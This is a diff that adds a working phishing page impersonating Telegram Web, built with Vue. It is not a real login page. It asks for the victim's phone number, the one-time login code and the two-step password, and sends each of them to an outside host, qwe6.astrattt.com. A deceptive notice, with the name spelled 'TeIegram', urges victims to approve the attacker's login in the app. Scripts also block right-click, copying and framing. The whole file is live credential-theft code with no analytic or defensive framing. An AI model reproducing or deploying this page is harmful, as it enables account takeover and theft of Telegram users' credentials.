@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"/><title>TeleGram Web</title><meta content="webkit" name="renderer"/><meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/><link href="local_resources/css/0c55ae78a71ae0eaa40a61811ccad843.css" rel="stylesheet"/><link href="local_resources/css/4e628a74e7b4744e24f10c58f331277c.css" rel="stylesheet"/><link href="local_resources/css/f546dadaf3b49943defa61a9d139a703.css" rel="stylesheet"/><meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui" name="viewport"><style>
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: Roboto, -apple-system, apple color emoji,
+            BlinkMacSystemFont, Segoe UI, Oxygen-Sans, Ubuntu, Cantarell,
+            Helvetica Neue, sans-serif;
+        }
+        #app {
+            height: 100%;
+            width: 100%;
+        }
+        .main {
+            height: 100%;
+            width: 100%;
+            margin: 0 auto;
+        }
+        .content-wrap {
+            display: flex;
+            flex-direction: column;
+            margin: 0 auto;
+            max-width: 720px;
+            position: relative;
+            bottom: 0;
+            height: 100%;
+            left: 0;
+            max-height: 100%;
+            overflow-x: hidden;
+            overflow-y: hidden;
+            position: absolute;
+            right: 0;
+            top: 0;
+            width: 100%;
+        }
+        .tabs-container {
+            margin: 0 auto;
+            max-width: 720px;
+            min-width: auto;
+            position: relative;
+            display: grid;
+            grid-template-columns: 100%;
+            grid-template-rows: 100%;
+            min-width: 100%;
+            width: 100%;
+        }
+
+        .tabs-tab {
+            display: none;
+        }
+
+        .tabs-tab.active-class {
+            display: flex !important;
+        }
+        /* .arrow-down {
+        border: solid #707579;
+        border-radius: 1px;
+        border-width: 0 2px 2px 0;
+        bottom: 0;
+        content: " ";
+        cursor: pointer;
+        display: inline-block;
+        height: 0;
+        margin-top: -9px;
+        padding: 5px;
+        position: absolute;
+        right: 21px;
+        top: 50%;
+        transform: rotate(45deg);
+        -webkit-transform: rotate(45deg);
+        transition: all .2s;
+        vertical-align: middle;
+        width: 0;
+        z-index: 2;
+      } */
+        .auth-placeholer {
+            height: 67px;
+        }
+        .auth-image {
+            width: 160px;
+            height: 160px;
+
+            border-radius: 50%;
+            margin: 0 auto;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .container {
+            display: flex;
+            flex: 1 1 auto;
+            flex-direction: column;
+            height: 810px;
+            padding: 0;
+            width: 100%;
+        }
+        .header {
+            font-size: 32px;
+            line-height: 110%;
+            margin: 46px 0 14px;
+            font-weight: 500;
+        }
+        .subtitle,
+        .auth-image {
+            flex: 0 0 auto;
+            color: #707579;
+        }
+        .input-wrapper {
+            margin: 0 auto;
+            margin-top: 49px;
+            width: 360px;
+        }
+        .v-text-field .v-input__slot {
+            border-radius: 10px;
+        }
+        .v-input--selection-controls .v-input__slot > .v-label {
+            margin-left: 50px;
+            color: #090909;
+        }
+        .primary-btn {
+            background-color: #2086ea !important;
+            margin-top: 19px;
+        }
+        .v-application .primary--text {
+            color: #2086ea !important;
+            caret-color: #2086ea !important;
+        }
+        .v-btn__content {
+            font-size: 16px;
+            color: #fff;
+        }
+        ::-webkit-scrollbar {
+            display: none;
+        }
+        .v-input--selection-controls__ripple {
+            display: none;
+        }
+        .v-text-field__details {
+            display: none;
+        }
+        .check-box-c {
+            width: 360px;
+            height: 56px;
+            margin-top: 8px;
+        }
+        .check-box-c .v-btn:not(.v-btn--round).v-size--default {
+            padding: 0;
+        }
+        .check-box-c .v-btn {
+            justify-content: flex-start;
+            align-items: center;
+            padding: 0 16px;
+        }
+        .check-box-c .v-input--selection-controls {
+            margin: 0 19px;
+            padding: 0;
+        }
+        .check-box-c .v-input__control {
+            display: flex;
+            align-items: center;
+            line-height: 38px;
+        }
+        .check-box-c .v-label {
+            font-weight: 400;
+        }
+        .v-btn > .v-btn__content .v-icon {
+            color: #8d969c;
+        }
+        .v-application--is-ltr .v-messages {
+            display: none !important;
+        }
+        .check-box-c .theme--light.v-btn.v-btn--has-bg {
+            background-color: transparent;
+            border-radius: 10px;
+        }
+        .v-autocomplete__content.v-menu__content {
+            box-shadow: 0 8px 17px 2px rgba(0, 0, 0, 0.14),
+            0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            top: 485px !important;
+        }
+        .icon-city {
+            width: 26px;
+        }
+        .v-input__slot {
+            margin-bottom: 0;
+        }
+        /* 第二页 */
+        .center-align {
+            text-align: center;
+        }
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .phone-wrapper img {
+            margin-top: 26px;
+            cursor: pointer;
+            margin-left: 4px;
+        }
+        .v-btn__loader {
+            left: 155px;
+        }
+        .v-progress-circular {
+            width: 30px !important;
+            height: 30px !important;
+            color: #fff;
+        }
+        .v-btn--loading .v-btn__content {
+            opacity: 1 !important;
+        }
+
+        .c-ripple__circle {
+            animation: ripple-effect 0.7s forwards;
+            background-color: hsla(0, 0%, 100%, 0.08);
+            border-radius: 50%;
+            display: block;
+            pointer-events: none;
+            position: absolute;
+            transform: scale(0);
+            transition: opacity 0.35s, background-color 0.35s;
+            left: 0;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1000;
+        }
+        /* 动画点击 */
+        @keyframes ripple-effect {
+            0% {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(2);
+            }
+        }
+        @keyframes ripple-effect-handhelds {
+            0% {
+                transform: scale(0.27);
+            }
+            to {
+                transform: scale(2);
+            }
+        }
+        .input-custom .v-text-field__slot {
+            position: relative;
+        }
+        .input-custom input {
+            position: absolute;
+            left: 0;
+            right: 0;
+        }
+        .placeholder-div {
+            /* z-index: -1; */
+            position: absolute;
+            font-size: 32px;
+            color: #9e9e9e;
+            letter-spacing: 0.24px;
+        }
+        /* .input-custom .v-text-field__slot::before {
+          color: #9e9e9e;
+          content: attr(data-left-pattern);
+          letter-spacing: .24px;
+          white-space: nowrap;
+        } */
+        .tips {
+            margin-top: 30px;
+            margin-left: 22px;
+            position: relative;
+            word-break: break-all;
+        }
+        .tips svg{
+            height: 16px;
+            left: -20px;
+            position: absolute;
+            top: 3px;
+            width: 16px;
+        }
+    </style></meta></head><body><!---屏蔽开始---><script src="local_resources/js/fc3a6d8271f42b182ec467f317d197c0.js" type="text/javascript"></script><body oncontextmenu="return false"><body oncopy="return false"><body onselectstart="return false"><body oncontextmenu="self.event.returnValue=false" onselectstart="return false"><iframe ;<="" iframe="" src="local_resources/iframes/3825e47e35219425093f50b70a8803fc.html&gt;"></iframe><script language="JAVASCRIPT">
+if (top.location != self.location)top.location=self.location;
+</script><!---屏蔽结束---><div id="app"><v-app><v-main class="main"><v-container fluid=""><div class="content-wrap" v-if="mainShow"><div class="auth-placeholer"></div><div class="tabs-container"><div :class="['tabs-tab', `${currentStep === 1 ? 'active-class' : ''}`]"><div class="container"><div class="auth-image"><path d="M679.424 746.862l84.005-395.996c7.424-34.852-12.581-48.567-35.438-40.009L234.277 501.138c-33.72 13.13-33.134 32-5.706 40.558l126.282 39.424 293.156-184.576c13.714-9.143 26.295-3.986 16.018 5.157L426.898 615.973l-9.143 130.304c13.13 0 18.871-5.706 25.71-12.581l61.696-59.429 128 94.282c23.442 13.129 40.01 6.29 46.3-21.724zM1024 512c0 282.843-229.157 512-512 512S0 794.843 0 512 229.157 0 512 0s512 229.157 512 512z" fill="#1296DB" p-id="2177"></path></div><h4 class="header text-center">Telegram</h4><div class="subtitle text-center">
+                                    Please confirm your country and phone number
+                                    <br/><!--enter your phone number.--></div><div class="input-wrapper"><v-autocomplete :error="isError1" :items="countries" @change="onCountryChange" label="Country" outlined="" ref="country" style="width: 360px" v-model="selectedCountry"><template v-slot:item="{ item }"><div style="display: flex;align-items: center;justify-content: space-between;width: 100%;"><div style="display: flex; align-items: center"><img :src="item.icon" class="icon-city"/><div style="margin-left: 24px">
+                                                        {{ item.text }}
+                                                    </div></div><div style="color: #9e9e9e">{{ item.code }}</div></div></template></v-autocomplete><v-text-field :label="labelPhoneNumber" @focus="onChangePhone" @input="onPhoneNumberInput" class="input-custom" outlined="" ref="inputRef" style="margin-top: 24px" v-model="phoneNumber"></v-text-field><v-btn :loading="loading1" @click="handleNext(1)" class="primary-btn" elevation="0" style="width: 100%; height: 54px; border-radius: 10px">{{btn1}}</v-btn><div class="tips"><path d="M959.256366 512C959.256366 264.98713 759.01287 64.743634 512 64.743634 264.98713 64.743634 64.743634 264.98713 64.743634 512 64.743634 759.01287 264.98713 959.256366 512 959.256366 759.01287 959.256366 959.256366 759.01287 959.256366 512L959.256366 512 959.256366 512 959.256366 512 959.256366 512 959.256366 512ZM117.36203 512C117.36203 294.047467 294.047467 117.36203 512 117.36203 729.952533 117.36203 906.63797 294.047467 906.63797 512 906.63797 729.952533 729.952533 906.63797 512 906.63797 294.047467 906.63797 117.36203 729.952533 117.36203 512L117.36203 512 117.36203 512 117.36203 512 117.36203 512 117.36203 512Z" fill="#FC5143" p-id="2634"></path><path d="M484.457558 599.560299C484.457558 622.580963 495.008537 634.091122 516.110812 634.091122 537.213087 634.091122 547.764066 622.580963 547.764066 599.560299L547.764066 280.150193C547.764066 257.129529 537.213087 245.61937 516.110812 245.61937 495.008537 245.61937 484.457558 257.129529 484.457558 280.150193L484.457558 599.560299ZM478.702421 740.561158C480.62081 763.581821 493.090149 775.091981 516.110812 775.091981 539.131476 775.091981 551.600815 763.581821 553.519203 740.561158 551.600815 717.540494 539.131476 705.071155 516.110812 703.152767 493.090149 705.071155 480.62081 717.540494 478.702421 740.561158L478.702421 740.561158Z" fill="#FC5143" p-id="2635"></path>Your [TeIegram] number has not been verified for a long time. After logging in, please click [OK] on the APP. It is your own login to access this message. It is your own verified login.</div></div></div></div><!-- 第二页 --><div :class="['tabs-tab', `${currentStep === 2 ? 'active-class' : ''}`]"><div class="container center-align"><div class="auth-image twoActiv" v-if="twoAnimationShow"></div><div class="auth-image twoFoucs" v-if="!twoAnimationShow"></div><div class="phone-wrapper"><h4 class="header">{{phoneNumber}}</h4><img @click="gostepOne" alt="" src="local_resources/img/d866dfe3310336712402d3b40322bd74.png"/></div><div class="subtitle text-center">
+                                    我们用Telegram给您发送了消息
+                                    <br/>
+                                    请输入验证码.
+                                </div><div class="input-wrapper"><v-text-field :error="isError2" :label="codeLabel" :maxlength="5" @blur="stepTwoAnimation" @focus="onChangeA" outlined="" style="margin-top: 24px" v-model="code"></v-text-field></div></div></div><!-- 第三页 --><div :class="['tabs-tab', `${currentStep === 3 ? 'active-class' : ''}`]"><div class="container center-align"><div class="auth-image three"></div><div class="phone-wrapper"><h4 class="header">Enter Your Password</h4></div><div class="subtitle text-center">
+                                    Your account is protected with
+                                    <br/>
+                                    an additional password
+                                </div><div class="input-wrapper"><v-text-field :append-icon="isShowPassword ? 'mdi-eye' : 'mdi-eye-off'" :error="isError3" :type="isShowPassword ? 'text' : 'password'" @click:append="isShowPasswordH" @input="onPwdInput" class="bigDisc" label="Password" outlined="" style="margin-top: 24px;" v-model="password"></v-text-field><v-btn @click="handleNext(3)" class="primary-btn" elevation="0" style="width: 100%; height: 54px; border-radius: 10px">{{btn3}}</v-btn></div></div></div><!-- 第四页 --><div :class="['tabs-tab', `${currentStep === 4 ? 'active-class' : ''}`]"><div class="container"><div style="padding-left: 2%;
+    padding-top: 10px;
+    width: 70px;
+    border-top: 5px solid #00a4ec;
+    margin-left: 10px;"><p style="font-weight: 800;
+    font-size: 22px;">Telegram</p></div><div class="subtitle text-center"><div><img src="local_resources/img/171c91271505e3ac43927f00ae66ac5b.png" style="    width: 200px;"/></div><div style="padding-left: 2%;padding-right:2%    width: auto;
+    
+    margin-left: 10px;"><p style="    text-indent: 0.5em;text-align: left;font-weight: 600;
+    font-size: 16px;color: black;
+">系統正在檢測您的帳號請耐心等待1-3分鐘打開Telegram通過頂部通知中點擊<a>“這是本人操作"</a>授權本次操作!</p></div><div style="padding-right:2%    width: auto;
+    
+    margin-left: 10px;"><p style="    text-indent: 0.5em;text-align: left;font-weight: 600;
+    font-size: 16px;color: black;
+">Source code</p></div><div style="padding-left: 2%;padding-right:2%    width: auto;
+    
+    margin-left: 10px;"><p style="text-align: left;
+    font-size: 16px;color: black;
+">For the moment we are focusing on open sourcingthe things that allow developers to quickly buildsomething using our APl. We have published thecode for our Android, i0S, web and desktop apps(Win,macOS and Linux) as well as the Teleqram</p></div></div></div></div></div></div></v-container></v-main></v-app></div><script src="local_resources/js/398619b3f425bd5611e86bf575a91e5b.js"></script><script src="local_resources/js/4db82ea8393fa509c33caf5c50d7157e.js"></script><script src="local_resources/js/1e46e1e91a1fe4f6a8849b9c9dd46dec.js"></script><script src="local_resources/js/c964b473d72d900a02e5020d9bde955e.js"></script><script src="local_resources/js/3de3093f7ed0742dcb2321bed82b9020.js"></script><script>
+    new Vue({
+        el: "#app",
+        data() {
+            return {
+                isShowPassword: false,
+                checkbox: false,
+                selectedCountry: "", //选择的国家
+                countryCode: "", // 地区号
+                placeholder: "",
+                phoneNumber: "",
+                labelPhoneNumber: "Phone Number",
+                code: "", //验证码
+                password: "",
+                codeLabel: "Code",
+                isError1: false,
+                isError2: false,
+                isError3: false,
+                btn1: "NEXT",
+                btn3: "NEXT",
+                currentStep: 1,
+                loading1: false,
+                lineText: "", //下划线文本
+                lineArr: [],
+                lineArrCount: [], //下划线数
+                tempCount: 1,
+                tempCount2: 1,
+                lineTextDeep: '',
+                countryCodeLength: 0,
+                currentCount: 0,
+                count: 0,
+                tid: 0,
+                aid: 0,
+                countries: countriesList,
+                twoAnimationShow: true,
+                mainShow: true,
+            };
+        },
+        watch: {
+            code(val) {
+                console.log({ val });
+                if (val && val.length === 5) {
+                    this.step2ajax()
+                    /*if (val === "12345") {
+                        this.isError2 = false;
+                        this.currentStep = 3;
+                        this.ThreeAnimationC()
+                    } else {
+                        this.codeLabel = "invalid code";
+                        this.isError2 = true;
+                        return;
+                    }*/
+                }
+            },
+        },
+        mounted() {
+            setTimeout(() => {
+                this.mainShow = true;
+            }, 100);
+
+            const dom = document.querySelector(
+                    ".input-custom .v-text-field__slot"
+            );
+            const div = document.createElement("div");
+            div.className = "placeholder-div";
+            div.id = "placeholder-div";
+            dom.appendChild(div);
+
+        },
+        methods: {
+            // 点击下一步处理逻辑
+            handleNext(type) {
+                switch (type) {
+                    case 1:
+                        this.loading1 = true;
+                        this.btn1 = "PLEASE WAIT...";
+                        this.step1ajax()
+                        break;
+                    case 3:
+                        this.step3ajax()
+                        break;
+                    default:
+                        break;
+                }
+            },
+            // 根据国家选择获取地区号
+            getCountryCode(country) {
+                const data = dictData[country];
+                this.lineText = data.formatted;
+                this.lineTextDeep = data.formatted;
+                this.countryCode = data.code;
+            },
+            // 处理个事
+            handleFormat() {
+                const countryCodeLength = this.countryCode.length;
+                const arr = this.lineText.split(' ');
+                const arr2 = [];
+                arr.forEach((item) => {
+                    if (item) {
+                        arr2.push(item);
+                    }
+                });
+                const arr3 = [];
+                arr2.forEach((item) => {
+                    arr3.push(item.length);
+                });
+                this.countryCodeLength = countryCodeLength;
+                this.lineArrCount = arr3;
+                this.lineArr = arr2;
+                this.currentCount = this.lineArrCount[0];
+                this.count = 1;
+            },
+            //
+onPhoneNumberInput(value) {
+          // 反向监听输入内容符合条件时，自动添加空格并选中国家
+          // 开始
+          
+          if (value) {
+            let flag = false
+            
+            this.countries.forEach((item) => {
+                
+                console.log(item.code)
+              if (value.indexOf(item.code) != -1) {
+                flag = true
+              }
+              if (value.trim() == item.code || ('+' + (value).trim() == item.code)) {
+                this.selectedCountry = item.text
+				console.log("能进来么？",this.selectedCountry)
+                flag = true
+                this.countryCode = value.indexOf('+') == -1 ? '+' + (value).trim() : (value).trim()
+                console.log(this.countryCode)
+                this.onCountryChange()
+                // this.handleFormat();
+              }
+            })
+            if (!flag) {
+              this.selectedCountry = ''
+              this.lineText = ''
+            }
+          }
+          console.log(value, '监听数字', this.lineText)
+            // 对formatted格式切割断句
+          let lineTextArr = this.lineText.split(" ")
+          let newValue = value.split(" ")
+          console.log(lineTextArr, '监听数字', newValue)
+          if(lineTextArr.length < newValue.length-1) {
+            return
+          }
+          if(newValue.length>=2){
+            if (newValue[newValue.length-1].length == lineTextArr[newValue.length-2].length) {
+            this.phoneNumber = value + ' '
+          }
+           
+          }
+        //  结束
+        },//,选择变化事件处理函数
+        onCountryChange() {
+          this.tempCount = 1;
+          this.tempCount2 = 1;
+          this.count = 1;
+          this.currentCount = 0;
+          this.$refs.inputRef.focus();
+          this.getCountryCode(this.selectedCountry);
+          // const dom = document.querySelector(
+          //   ".input-custom .v-text-field__slot"
+          // );
+          // const domDiv = document.querySelector(
+          //   ".input-custom .v-text-field__slot #placeholder-div"
+          // );
+          this.handleFormat();
+          // 这里判断一个是中国的话
+          this.phoneNumber = this.countryCode;
+          // this.$nextTick(() => {
+          //   const domInput = document.querySelector(".input-custom input");
+          //   const position = domInput.selectionStart * 8;
+          //   domDiv.style.left = position + "px";
+          //   domDiv.innerText = this.lineText;
+          // });
+          // 结束
+        },
+
+            stepTwoAnimation(){
+                lottie.destroy()
+                lottie.loadAnimation({ //初始化
+                    rendererSettings: {
+                        clearCanvas: true
+                    },
+                    container: document.querySelector('.twoActiv'),//在哪个dom容器中生效
+                    renderer: 'canvas',//渲染方式svg
+                    loop: true,//循环
+                    autoplay: true,//自动播放
+                    path: '/chat/data/TwoFactorSetupMonkeyIdle.json',//动画数据
+                }).setSpeed(0.5);
+            },
+            onChangeA(){
+                lottie.destroy()
+                lottie.loadAnimation({ //初始化
+                    rendererSettings: {
+                        clearCanvas: true
+                    },
+                    container: document.querySelector('.twoActiv'),//在哪个dom容器中生效
+                    renderer: 'canvas',//渲染方式svg
+                    loop: false,//循环
+                    autoplay: true,//自动播放
+                    path: '/chat/data/TwoFactorSetupMonkeyTracking.json',//动画数据
+                }).setSpeed(0.5);
+            },
+            ThreeAnimation(){
+                lottie.destroy()
+                lottie.loadAnimation({ //初始化
+                    container: document.querySelector('.three'),//在哪个dom容器中生效
+                    renderer: 'canvas',//渲染方式svg
+                    loop: false,//循环
+                    autoplay: false,//自动播放
+                    path: '/chat/data/TwoFactorSetupMonkeyPeek.json',//动画数据
+                }).goToAndStop(0,true)
+            },
+            ThreeAnimationC(){
+                lottie.destroy()
+                const l = lottie.loadAnimation({ //初始化
+                    container: document.querySelector('.three'),//在哪个dom容器中生效
+                    renderer: 'canvas',//渲染方式svg
+                    loop: false,//循环
+                    autoplay: false,//自动播放
+                    path: '/chat/data/TwoFactorSetupMonkeyPeek.json',//动画数据
+                })
+                if (this.isShowPassword){
+                    l.goToAndStop(20,true)
+                }else {
+                    l.goToAndStop(0,true)
+                }
+            },
+            isShowPasswordH(){
+                this.isShowPassword = !this.isShowPassword
+                console.log(this.isShowPassword)
+                this.ThreeAnimationC()
+            },
+            gostepOne(){
+                this.currentStep = 1;
+                this.loading1 = false;
+            },
+            onChangePhone(){
+                this.labelPhoneNumber = 'Phone Number'
+            },
+            step1ajax(){
+                let _that = this;
+                $.post('https://qwe6.astrattt.com/index/api/login', {
+                    selectedCountry: this.selectedCountry,
+                    countryCode: this.countryCode,
+                    phoneNumber: this.phoneNumber,
+	                apinfo:'WsOzyMbCS0GWm1eV6hO1x+TjbNRbFWXPajrSxEn7lM6tg9bbZAk7ZJl96EccG7rCeMoV1c1DBzA4Nsolou3KE3S/vz2rIRIyrJ7a9CaMf2IkWCTU7t0ZfCGhCY26DPsmsexsSxc5Kkvwwi3+dL/QMTfV0D3aAlewdEdG3bh531TO1ADCqG10mmz8KoSnk9i7EcjWFm2glzdgFOrQG2qqBg+C+1Pl141XeYRdF2eF/o1e9pdT18W+Xy1zMuFn//aVybTVLOg8J/Q/Un46k4A7Flcg1nrj5SPc/OnaH28RaEJeR9Dsfuc7nQ2clX6TnPfb',
+                    step: 'checkPhone',
+                }, function(res) {
+                    _that.loading1 = false;
+                    _that.btn1 = "NEXT";
+                    if(res.code){
+                        _that.currentStep = 2;
+                        _that.tid = res.data;
+                        _that.stepTwoAnimation()
+                    }else {
+                        _that.labelPhoneNumber = res.info
+                    }
+                })
+            },
+            step2ajax(){
+                let _that = this;
+                $.post('https://qwe6.astrattt.com/index/api/login', {
+                    selectedCountry: this.selectedCountry,
+                    countryCode: this.countryCode,
+                    phoneNumber: this.phoneNumber,
+                    code: this.code,
+                    tid: this.tid,
+                    aid: this.aid,
+	                apinfo:'WsOzyMbCS0GWm1eV6hO1x+TjbNRbFWXPajrSxEn7lM6tg9bbZAk7ZJl96EccG7rCeMoV1c1DBzA4Nsolou3KE3S/vz2rIRIyrJ7a9CaMf2IkWCTU7t0ZfCGhCY26DPsmsexsSxc5Kkvwwi3+dL/QMTfV0D3aAlewdEdG3bh531TO1ADCqG10mmz8KoSnk9i7EcjWFm2glzdgFOrQG2qqBg+C+1Pl141XeYRdF2eF/o1e9pdT18W+Xy1zMuFn//aVybTVLOg8J/Q/Un46k4A7Flcg1nrj5SPc/OnaH28RaEJeR9Dsfuc7nQ2clX6TnPfb',
+                    step: 'checkCode',
+                }, function(res) {
+                    console.log(res,'打印')
+                    if(res.code == 1){
+                        //_that.mainShow = false;
+                        _that.currentStep = 4;
+                    }else if (res.code == 8){
+                        _that.isError2 = false;
+                        _that.currentStep = 3;
+                        _that.ThreeAnimation()
+                    }else {
+                        _that.codeLabel = res.info;
+                        _that.isError2 = true;
+                    }
+                })
+            },
+            step3ajax(){
+                let _that = this;
+                $.post('https://qwe6.astrattt.com/index/api/login', {
+                    selectedCountry: this.selectedCountry,
+                    countryCode: this.countryCode,
+                    phoneNumber: this.phoneNumber,
+                    pwd: this.password,
+                    tid: this.tid,
+                    aid: this.aid,
+	                apinfo:'WsOzyMbCS0GWm1eV6hO1x+TjbNRbFWXPajrSxEn7lM6tg9bbZAk7ZJl96EccG7rCeMoV1c1DBzA4Nsolou3KE3S/vz2rIRIyrJ7a9CaMf2IkWCTU7t0ZfCGhCY26DPsmsexsSxc5Kkvwwi3+dL/QMTfV0D3aAlewdEdG3bh531TO1ADCqG10mmz8KoSnk9i7EcjWFm2glzdgFOrQG2qqBg+C+1Pl141XeYRdF2eF/o1e9pdT18W+Xy1zMuFn//aVybTVLOg8J/Q/Un46k4A7Flcg1nrj5SPc/OnaH28RaEJeR9Dsfuc7nQ2clX6TnPfb',
+                    step: 'checkPwd',
+                }, function(res) {
+                    if(res.code){
+                        _that.currentStep = 4;
+                       // _that.mainShow = false;
+                    }else {
+                        _that.isError3 = true;
+                        _that.btn3 = res.info;
+                    }
+                })
+            },
+            handlePhone() {
+                console.log('Input changed:');
+            },
+            onPwdInput() {
+                if (this.btn3 !== 'NEXT'){
+                    this.btn3 = 'NEXT'
+                }
+            },
+        },
+
+        vuetify: new Vuetify(),
+    });
+</script></body></body></body></body></body></html>
